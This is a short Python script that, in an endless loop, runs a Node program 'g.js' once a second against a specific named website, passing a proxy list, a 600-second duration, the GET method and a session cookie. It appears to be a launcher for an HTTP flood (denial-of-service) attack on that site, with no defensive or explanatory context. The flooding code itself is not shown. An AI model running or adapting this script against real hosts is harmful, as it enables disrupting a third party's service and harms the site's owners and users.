import schedule
import time
import os
import sys

os.system('node g.js http://bct.ckgroup.ph http.txt 600 GET PHPSESSID:bi3792grr467jilf0hpo704eii')

def job():
    os.system('node g.js http://bct.ckgroup.ph http.txt 600 GET PHPSESSID:bi3792grr467jilf0hpo704eii')
    
schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)